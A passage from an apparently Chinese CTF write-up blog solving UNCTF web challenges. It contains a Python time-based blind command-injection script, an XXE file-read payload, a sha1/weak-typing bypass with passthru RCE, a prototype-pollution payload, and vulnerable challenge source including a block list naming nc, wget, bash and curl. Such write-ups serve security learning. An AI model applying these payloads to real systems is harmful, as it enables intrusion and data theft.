invoke__">str_replace</span>(<span class="hljs-string">&quot;A\&quot;:1&quot;</span>,<span class="hljs-string">&quot;A\&quot;:2&quot;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b1</span>)));<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744853.png" alt="image-20221112214932820"></p><h2 id="easy-rce-西南科技大学"><a href="#easy-rce-西南科技大学" class="headerlink" title="easy_rce-西南科技大学"></a>easy_rce-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744854.png" alt="image-20221119102131577"></p><p>rce布尔盲注</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># flag in /flag</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br><br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\@|\#|\%|:|&amp;|;|\\\\|&quot;|\&#x27;|`|\.|\&amp;|\*|&gt;|&lt;|nc|wget|bash|sh|netcat|grep|base64|rev|curl|wget|php|ping|cat|fl|mkdir/i&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;<br><br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$code</span>,<span class="hljs-variable">$output</span>,<span class="hljs-variable">$return_val</span>);<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$return_val</span>)   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail&quot;</span>; <br>        &#125;<br>                    <br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;小黑子,露出只因脚了吧&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>发现</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> [ t == t ]%0athen <span class="hljs-keyword">sleep</span> <span class="hljs-number">3</span>%0afi<br></code></pre></td></tr></table></figure><p>成功执行。可以截取字符进行逐个比对。</p><p>;用%0a绕过，&#96;用$()绕过。</p><p>得到命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=<span class="hljs-keyword">if</span> [ $(<span class="hljs-built_in">tac</span> /f?ag |awk NR=1 |<span class="hljs-built_in">cut</span> -c 1) == U ]%0a <span class="hljs-keyword">then</span> <span class="hljs-built_in">sleep</span> 3%0afi<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>cmd = <span class="hljs-string">&#x27;tac /f?ag&#x27;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br>proxies=&#123;<span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>,<span class="hljs-string">&#x27;https&#x27;</span>:<span class="hljs-string">&#x27;https://127.0.0.1:8080&#x27;</span>&#125;<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>):<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        payload = <span class="hljs-string">f&quot;if [ $(<span class="hljs-subst">&#123;cmd&#125;</span> |awk NR==1|cut -c <span class="hljs-subst">&#123;j&#125;</span>) == <span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(k)&#125;</span> ]%0a then sleep 1%0afi&quot;</span><br>        payload = <span class="hljs-string">&#x27;?code=&#x27;</span> + payload<br>        <span class="hljs-comment"># print(payload)</span><br>        <span class="hljs-comment"># break</span><br>        url = <span class="hljs-string">&#x27;http://1c6e61dc-14c1-4eaf-b82d-477f7ea47fb2.node.yuzhian.com.cn/&#x27;</span><br>        t1=time.time()<br>        requests.get(url + payload)<br>        t2=time.time()<br>        <span class="hljs-keyword">if</span> t2-t1&gt;<span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span>(t2-t1)<br>            result+=<span class="hljs-built_in">chr</span>(k)<br>            <span class="hljs-built_in">print</span>(payload)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br><br>result = result + <span class="hljs-string">&quot;\n&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744855.png" alt="image-20221118222858306"></p><h2 id="ezgame-浙江师范大学"><a href="#ezgame-浙江师范大学" class="headerlink" title="ezgame-浙江师范大学"></a>ezgame-浙江师范大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744856.png" alt="image-20221118203634618"></p><p>main.js搜索UNCTF发现以下字段，组合得到flag，注意对比之前flag的格式</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a27d</span>-<span class="hljs-number">6</span>f88-<br><br><span class="hljs-attribute">49fb</span>-a510-<br><br><span class="hljs-attribute">fe7b163f8d</span><br><br><span class="hljs-attribute">unctf</span>&#123;c5f9<br><br><span class="hljs-attribute">d3</span>&#125;<br></code></pre></td></tr></table></figure><p>UNCTF{c5f9a27d-6f88-49fb-a510-fe7b163f8dd3}</p><p>UNCTF{c5f949fb-a510-a27d-6f88-fe7b163f8dd3}</p><p>试一下就行</p><h2 id="听说php有一个xxe-西南科技大学"><a href="#听说php有一个xxe-西南科技大学" class="headerlink" title="听说php有一个xxe-西南科技大学"></a>听说php有一个xxe-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744857.png" alt="image-20221119102153137"></p><p>dom.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>(); $<br>dom-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$data</span>); <br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$dom</span>);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; <br>&lt;!DOCTYPE xxe [ <br>&lt;!ELEMENT name ANY &gt; <br>&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot; &gt;]&gt; <br>&lt;root&gt; <br>&lt;name&gt;&amp;xxe;&lt;/name&gt; <br>&lt;/root&gt;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744858.png" alt="image-20221112225449261"></p><h2 id="babyphp-中国人民公安大学"><a href="#babyphp-中国人民公安大学" class="headerlink" title="babyphp-中国人民公安大学"></a>babyphp-中国人民公安大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744859.png" alt="image-20221119102214570"></p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]==<span class="hljs-number">0</span>&amp;&amp;<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]!==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key1&quot;</span>])&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key2&quot;</span>]))&#123;<br>            <span class="hljs-variable">$key1</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key1&quot;</span>];<br>            <span class="hljs-variable">$key2</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key2&quot;</span>];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$key1</span>!==<span class="hljs-variable">$key2</span>&amp;&amp;<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$key1</span>)==<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$key2</span>))&#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;code&quot;</span>]))&#123;<br>                    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;code&quot;</span>];<br>                    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|txt|cat|tac|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$code</span>))&#123;<br>                        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;有手就行&lt;/br&gt;&quot;</span>;<br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;老套路了&lt;/br&gt;&quot;</span>;<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;很简单的，很快就拿flag了~_~&lt;/br&gt;&quot;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;百度就能搜到的东西&lt;/br&gt;&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;easy 不 easy ,baby 真 baby,都是玩烂的东西，快拿flag！！！&lt;/br&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>弱类型，sha1绕过+rce</p><p>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">index</span>.php?code=passthru(<span class="hljs-string">&quot;nl%09/fla*&quot;</span>);<br><span class="hljs-attribute">post</span>:<br><span class="hljs-attribute">a</span>=<span class="hljs-number">0</span>a&amp;key1[]=<span class="hljs-number">0</span>&amp;key2[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744860.png" alt="image-20221112230110346"></p><h2 id="快乐三消-河南理工大学"><a href="#快乐三消-河南理工大学" class="headerlink" title="快乐三消-河南理工大学"></a>快乐三消-河南理工大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744861.png" alt="image-20221119102232201"></p><p>git泄露，扫描出来一堆文件，还有一个登录界面。</p><p>访问phpinfo.php即可得到flag。</p><h2 id="babynode-云南大学"><a href="#babynode-云南大学" class="headerlink" title="babynode-云南大学"></a>babynode-云南大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744862.png" alt="image-20221119102302714"></p><p>源码：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs json">app.post(&#x27;/&#x27;<span class="hljs-punctuation">,</span> function(req<span class="hljs-punctuation">,</span> res) <span class="hljs-punctuation">&#123;</span><br>var flag=&#x27;flag&#x27;;<br>var admin = <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>;<br>let user = <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>;<br>try<span class="hljs-punctuation">&#123;</span>copy(user<span class="hljs-punctuation">,</span>req.body);<span class="hljs-punctuation">&#125;</span> <br>catch (error)<br><span class="hljs-punctuation">&#123;</span><br>res.send(<span class="hljs-string">&quot;copy error&quot;</span>);<br>return;<br><span class="hljs-punctuation">&#125;</span><br>if(admin.id===&#x27;unctf&#x27;)<br><span class="hljs-punctuation">&#123;</span><br>res.end(flag);<br><span class="hljs-punctuation">&#125;</span><br>else<br><span class="hljs-punctuation">&#123;</span><br>return res.end(<span class="hljs-string">&quot;error&quot;</span>);<br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br>)<br></code></pre></td></tr></table></figure><p>nodejs原型链污染，<a href="https://www.anquanke.com/post/id/236182#h3-10">参考</a>，没玩过，以后有空补上原理</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">copy</span>(<span class="hljs-keyword">user</span>,req.body);<br></code></pre></td></tr></table></figure><p>利用这里可实现原型链污染，使得<code>admin</code>继承<code>Object.prototype</code></p><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;unctf&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744863.png" alt="image-20221115224045563"></p><p>content-type记得改为json</p><h2 id="easy-ssti-金陵科技学院"><a href="#easy-ssti-金陵科技学院" class="headerlink" title="easy ssti-金陵科技学院"></a>easy ssti-金陵科技学院</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744864.png" alt="image-20221119102430915"></p><p>只过滤了class的SSTI</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string, redirect, url_for<br><span class="hljs-keyword">import</span> re<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params">&amp;<span class="hljs-comment">#34;/&amp;#34;)</span></span></span><br><span class="hljs-params"><span class="hljs-meta"><span class="hljs-keyword">def</span> home(<span class="hljs-params"></span>):</span></span><br><span class="hljs-params"><span class="hljs-meta"><span class="hljs-keyword">return</span> render_template(<span class="hljs-params">&amp;<span class="hljs-comment">#34;index.html&amp;#34;)</span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">@app.route(<span class="hljs-params">&amp;<span class="hljs-comment">#39;/register&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;])</span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"><span class="hljs-keyword">def</span> chall(<span class="hljs-params"></span>):</span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"><span class="hljs-keyword">if</span> request.method == &amp;<span class="hljs-comment">#34;POST&amp;#34;:</span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">name = request.form[&amp;<span class="hljs-comment">#39;user&amp;#39;]</span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"><span class="hljs-keyword">if</span> name.find(<span class="hljs-params">&amp;<span class="hljs-comment">#39;class&amp;#39;)!=-1:</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"><span class="hljs-keyword">return</span> render_template(<span class="hljs-params">&amp;<span class="hljs-comment">#34;warning.html&amp;#34;)</span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">template = &amp;<span class="hljs-comment">#39;&amp;#39;&amp;#39;</span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;html&amp;gt; </span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;恭喜你&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt; </span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;body&amp;gt; &amp;lt;center&amp;gt; </span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;h1&amp;gt;恭喜你登录进来了&amp;lt;/h1&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;h3&amp;gt;flag就在 &amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    我草 我flag呢 &amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    flag，到底应该如何实现。 flag，到底应该如何实现。  &amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    要想清楚，flag，到底是一种怎么样的存在。 那么， flag因何而发生?这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 &amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    莎士比亚在不经意间这样说过，本来无望的事，大胆尝试，往往能成功。 &amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    这启发了我， 我们不得不面对一个非常尴尬的事实，那就是， 笛卡儿曾经说过，阅读一切好书如同和过去最杰出的人谈话。 &amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    这句话语虽然很短，但令我浮想联翩。&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    我认为， 海贝尔在不经意间这样说过，人生就是学校。&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    在那里，与其说好的教师是幸福，不如说好的教师是不幸。&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    我希望诸位也能好好地体会这句话。 博在不经意间这样说过，一次失败，只是证明我们成功的决心还够坚强。 维我希望诸位也能好好地体会这句话。&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    现在，解决flag的问题，是非常非常重要的。 所以， 我们都知道，只要有意义，那么就必须慎重考虑。&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    所以， 既然如何， flag，发生了会如何，不发生又会如何。 &amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;/center&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;center&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    &amp;lt;h4&amp;gt;你好 %s&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    找什么flag玩玩游戏吧，ctf也就图一乐&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    我知道你很急，但是你先别急&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    虽然你找不到flag,但是也许你可以点点下面的按钮祝福我早日脱单&amp;lt;br&amp;gt;&amp;lt;/h4&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    &amp;lt;button <span class="hljs-built_in">id</span>=&amp;<span class="hljs-comment">#34;text-button&amp;#34;&amp;gt;&amp;lt;p id=&amp;#34;text&amp;#34;&amp;gt;单击祝福出题人早日脱单，让世界充满爱&amp;lt;/p&amp;gt;&amp;lt;/button&amp;gt;</span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;style&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"><span class="hljs-comment">#text-button &#123;</span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"> display: block;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"> cursor: pointer;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"> width: 160px;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"> text-align: center;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span 